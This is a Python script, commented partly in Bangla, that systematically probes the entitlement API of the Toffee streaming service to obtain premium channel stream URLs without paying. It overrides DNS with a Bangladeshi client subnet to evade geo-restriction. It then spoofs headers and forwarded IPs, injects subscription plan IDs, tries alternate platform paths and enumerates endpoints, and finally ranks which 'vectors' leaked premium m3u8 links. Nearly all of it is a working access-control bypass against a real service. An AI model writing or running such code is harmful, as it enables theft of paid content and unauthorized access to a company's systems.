#!/usr/bin/env python3
"""
force_api.py
Toffee entitlement API-কে প্রিমিয়াম URL দিতে বাধ্য করার systematic probe।
কোনো headless browser ছাড়া, শুধু requests।
আউটপুট: results/force_report.json
"""

import os
import re
import json
import socket
import requests

# ---------------- geo-DNS patch ----------------
ECS = os.getenv("BD_ECS", "103.4.145.0/24")
_c = {}

def _doh(h):
    if h in _c:
        return _c[h]
    ips = []
    for t in ("A", "AAAA"):
        try:
            r = requests.get("https://dns.google/resolve", timeout=10,
                             params={"name": h, "type": t, "edns_client_subnet": ECS})
            for a in r.json().get("Answer", []):
                if a.get("type") in (1, 28):
                    ips.append(a["data"])
        except Exception:
            pass
    _c[h] = ips
    return ips

_og = socket.getaddrinfo

def _gai(h, p, f=0, t=0, pr=0, fl=0):
    try:
        return _og(h, p, f, t, pr, fl)
    except socket.gaierror:
        ips = _doh(h)
        if not ips:
            raise
        return [(socket.AF_INET6 if ":" in i else socket.AF_INET,
                 socket.SOCK_STREAM, 6, "", (i, p)) for i in ips]

socket.getaddrinfo = _gai
print("[*] geo-DNS patch on")

# ---------------- config ----------------
TOKEN = os.getenv("DEVICE_TOKEN")
OUT = "results"
os.makedirs(OUT, exist_ok=True)

HOST = "https://entitlement-prod.services.toffeelive.com/toffee/BD/DK"
UA_WEB = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
UA_APP = "Toffee (Linux;Android 14) AndroidXMedia3/1.1.1/64103898/4d2ec9b8c7534adc"

FREE_IDS = {"Bangla TV": "JiK-_poBEef-9-uVZv6L"}
PREM_IDS = {"Sony Ten Sports 1 HD": "py5j-JQBv9knK3AHxDTY",
            "Cartoon Network": "mC6W-JQBv9knK3AHfDWA",
            "Discovery": "KS6x-JQBv9knK3AHwDZy"}

PLANS = ["PRIWP00005", "PRMJS00004", "TK0ULTOF1D", "TK0ULTOF1DPOST",
         "PRYVU00010", "BLALLPACKPLANGTE7", "TK0USSD7DGTOFSUBS"]

REPORT = []


# ---------------- helpers ----------------
def hdr(ua=UA_WEB, extra=None):
    h = {"Accept": "application/json", "Content-Type": "application/json",
         "User-Agent": ua, "Origin": "https://toffeelive.com",
         "Referer": "https://toffeelive.com/"}
    if TOKEN:
        h["Authorization"] = f"Bearer {TOKEN}"
    if extra:
        h.update(extra)
    return h


def find_m3u8(obj):
    out = []
    if isinstance(obj, dict):
        for v in obj.values():
            out += find_m3u8(v)
    elif isinstance(obj, list):
        for v in obj:
            out += find_m3u8(v)
    elif isinstance(obj, str) and ".m3u8" in obj:
        out.append(obj)
    return out


def streams_of(resp):
    if not resp or "json" not in resp.headers.get("content-type", ""):
        return []
    try:
        return find_m3u8(resp.json())
    except Exception:
        return []


def call(method, url, headers, body=None, params=None):
    try:
        if method == "POST":
            return requests.post(url, headers=headers, json=body if body is not None else {},
                                 timeout=20, params=params)
        return requests.get(url, headers=headers, timeout=20, params=params)
    except Exception as e:
        return e


def record(section, label, resp, cid, extra=None):
    if isinstance(resp, Exception):
        REPORT.append({"section": section, "label": label, "channel": cid,
                       "status": None, "streams": [], "error": str(resp),
                       "snippet": "", "extra": extra})
        return []
    st = streams_of(resp)
    REPORT.append({"section": section, "label": label, "channel": cid,
                   "status": resp.status_code, "streams": st,
                   "error": "", "snippet": resp.text[:400], "extra": extra})
    return st


def line(label, resp, extra=""):
    if isinstance(resp, Exception):
        print(f"    {label:28s} ERR {resp}")
        return
    st = streams_of(resp)
    flag = "★YES" if st else " no "
    print(f"    {label:28s} {resp.status_code:4} {flag} {extra}")
    if st:
        print(f"        -> {st[0][:150]}")


# ---------------- 0. baseline ----------------
def section_baseline():
    print("\n### 0. baseline (free vs premium)")
    for label, cid in {**FREE_IDS, **PREM_IDS}.items():
        r = call("POST", f"{HOST}/web/playback/{cid}", hdr())
        record("baseline", label, r, cid)
        line(label, r, (r.text[:90] if not isinstance(r, Exception) else ""))


# ---------------- 1. platform ----------------
def section_platform():
    print("\n### 1. platform path variants")
    for plat in ["web", "android", "ios", "tv", "firetv", "smarttv", "browser", "app"]:
        for label, cid in PREM_IDS.items():
            r = call("POST", f"{HOST}/{plat}/playback/{cid}", hdr())
            record("platform", f"{plat}/{label}", r, cid, {"platform": plat})
            line(f"{plat} / {label[:18]}", r)


# ---------------- 2. header spoof ----------------
def section_headers():
    print("\n### 2. header spoof")
    variants = [("app-ua", {"User-Agent": UA_APP}),
                ("client-api-header", {"client-api-header": "null"}),
                ("xff-bd", {"X-Forwarded-For": "103.4.145.10"}),
                ("xff-bd+api", {"X-Forwarded-For": "103.4.145.10",
                                "client-api-header": "null"}),
                ("referer-bd", {"Referer": "https://toffeelive.com/en/live"})]
    for label, hx in variants:
        for name, cid in PREM_IDS.items():
            r = call("POST", f"{HOST}/web/playback/{cid}", hdr(extra=hx))
            record("headers", f"{label}/{name}", r, cid, {"headers": hx})
            line(f"{label} / {name[:18]}", r)


# ---------------- 3. plan force ----------------
def section_plan():
    print("\n### 3. plan force (body + query, POST + GET)")
    for pl in PLANS:
        for body in [{"plan": pl}, {"plan_id": pl}, {"subscription_id": pl},
                     {"plan": pl, "channel_id": list(PREM_IDS.values())[0]}]:
            r = call("POST", f"{HOST}/web/playback/{list(PREM_IDS.values())[0]}",
                     hdr(), body=body)
            record("plan", f"body={body}", r, list(PREM_IDS.values())[0], {"plan": pl})
            if streams_of(r):
                line(f"body {pl}", r)
        # query
        for method in ("POST", "GET"):
            r = call(method, f"{HOST}/web/playback/{list(PREM_IDS.values())[0]}",
                     hdr(), params={"plan": pl})
            record("plan", f"{method} query plan={pl}", r, list(PREM_IDS.values())[0],
                   {"plan": pl, "via": method})
            line(f"{method} query {pl}", r)


# ---------------- 4. other endpoints ----------------
def section_endpoints():
    print("\n### 4. other endpoints")
    for path in ["channels", "channel", "content", "stream", "play", "live",
                 "home", "genres", "contents", "epg", "sections", "rail",
                 "playback", "plan", "plans", "entitlement", "subscription"]:
        for suffix in ["", f"/{list(PREM_IDS.values())[0]}"]:
            for method in ("POST", "GET"):
                url = f"{HOST}/web/{path}{suffix}"
                r = call(method, url, hdr())
                if isinstance(r, Exception):
                    continue
                if r.status_code == 200:
                    record("endpoints", f"{method} {path}{suffix}", r,
                           list(PREM_IDS.values())[0])
                    line(f"{method} {path}{suffix}", r)


# ---------------- main ----------------
def main():
    print("=" * 64)
    print("Toffee Force-API Probe")
    print("=" * 64)

    if not TOKEN:
        print("[!] DEVICE_TOKEN missing — কিছু probe 401 দিতে পারে")

    section_baseline()
    section_platform()
    section_headers()
    section_plan()
    section_endpoints()

    # ---- summary ----
    working = [r for r in REPORT if r["streams"] and r["channel"] in PREM_IDS.values()]
    print("\n" + "=" * 64)
    print(f"WORKING VECTORS (premium URL দিল): {len(working)}")
    for w in working:
        print(f"  ★ {w['section']} | {w['label']} | {w['status']}")
        print(f"     {w['streams'][0][:160]}")

    json.dump({"working": working, "report": REPORT},
              open(f"{OUT}/force_report.json", "w", encoding="utf-8"),
              indent=2, ensure_ascii=False)

    # যদি কোনো vector সব premium-এ কাজ করে, সেটাই "strategy"
    by_label = {}
    for w in working:
        by_label.setdefault(w["label"], 0)
        by_label[w["label"]] += 1
    best = sorted(by_label.items(), key=lambda x: -x[1])[:5]
    print("\nTOP strategies (label -> কতটা premium-এ কাজ করেছে):")
    for lbl, n in best:
        print(f"  {n}/{len(PREM_IDS)}  {lbl}")

    json.dump(best, open(f"{OUT}/top_strategies.json", "w", encoding="utf-8"),
              indent=2, ensure_ascii=False)
    print(f"\n[+] report -> {OUT}/force_report.json")


if __name__ == "__main__":
    main()
